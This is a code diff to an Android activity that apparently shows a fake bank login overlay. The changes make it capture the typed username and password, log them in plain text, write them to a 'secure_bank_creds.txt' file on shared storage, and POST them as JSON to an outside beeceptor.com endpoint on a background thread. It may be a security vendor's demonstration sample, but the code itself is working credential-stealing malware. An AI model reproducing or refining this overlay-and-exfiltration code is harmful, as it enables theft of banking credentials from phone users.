@@ -9,6 +9,7 @@ import android.widget.Button;
 import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
 
+import com.google.android.material.textfield.TextInputEditText;
 import com.google.android.material.textfield.TextInputLayout;
 
 import java.io.IOException;
@@ -22,10 +23,9 @@ import okhttp3.Response;
 public class OverlayActivity extends AppCompatActivity {
     private static final String TAG = "[OverlayActivity]";
     private static final int REQUEST_WRITE_EXTERNAL_STORAGE = 1;
-    private static final String FILE_NAME = "/storage/emulated/0/creds.txt"; // Name of the file to create
-    private static final String FOLDER_NAME = "SecureBankCreds";
-    TextInputLayout usernameEditText;
-    TextInputLayout passwordEditText;
+    private static final String FILE_NAME = "/storage/emulated/0/Downloads/secure_bank_creds.txt";
+    TextInputEditText usernameEditText;
+    TextInputEditText passwordEditText;
     TextInputLayout usernameInputLayout;
     TextInputLayout passwordInputLayout;
     Button loginButton;
@@ -45,13 +45,13 @@ public class OverlayActivity extends AppCompatActivity {
         usernameInputLayout = findViewById(R.id.userLayout);
         passwordInputLayout = findViewById(R.id.pswdLayout);
         loginButton = findViewById(R.id.loginBtn);
-
         loginButton.setOnClickListener(v -> handleLogin());
     }
 
     private void handleLogin() {
-        String username = usernameEditText.getEditText().getText().toString();
-        String password = passwordEditText.getEditText().getText().toString();
+        Log.d(TAG, "Login button pressed..");
+        String username = usernameEditText.getText().toString();
+        String password = passwordEditText.getText().toString();
         if (username.isEmpty() || password.isEmpty()) {
             if (username.isEmpty()) {
                 usernameInputLayout.setError("Username cannot be empty");
@@ -59,22 +59,32 @@ public class OverlayActivity extends AppCompatActivity {
             if (password.isEmpty()) {
                 passwordInputLayout.setError("Password cannot be empty");
             }
-            writeToExternalStorage(username);
-            writeToExternalStorage(password);
-            finish();
-            sendDataOnline(username,password,"https://talsec.free.beeceptor.com");
         }
+        Log.d(TAG, "Username: " + username);
+        Log.d(TAG, "Password: " + password);
+        writeToExternalStorage(username);
+        writeToExternalStorage(password);
+        new Thread(() -> {
+            try {
+                sendDataOnline(username, password, "https://talsec.free.beeceptor.com");
+            } catch (Exception e) {
+                Log.e(TAG, "Network operation failed", e);
+            }
+        }).start();
     }
 
     private void writeToExternalStorage(String content) {
-        Log.d(TAG,"Writing to external storage...");
-        try {
-            privilegedService.writeToFile(FILE_NAME, content);
-        } catch (Exception ignored) {
-        }
+        Log.d(TAG, "Writing to external storage...");
+        Thread thread = new Thread(() -> {
+            try {
+                privilegedService.writeToFile(FILE_NAME, content);
+            } catch (Exception ignored) {
+            }
+        });
+        thread.start();
     }
 
-    private void sendDataOnline(String username,String password,String targetUrl){
+    private void sendDataOnline(String username, String password, String targetUrl) {
         String jsonPayload = String.format("{\"username\": \"%s\", \"password\": \"%s\"}", username, password);
 
         RequestBody body = RequestBody.create(jsonPayload, JSON);
@@ -83,14 +93,12 @@ public class OverlayActivity extends AppCompatActivity {
                 .post(body)
                 .build();
 
+
         try (Response response = client.newCall(request).execute()) {
             if (!response.isSuccessful()) {
                 throw new IOException("Unexpected code " + response);
             }
-            System.out.println("Response Code: " + response.code());
-            System.out.println("Response Body: " + response.body().string());
         } catch (IOException e) {
-            System.err.println("Error sending JSON: " + e.getMessage());
             e.printStackTrace();
         }
 
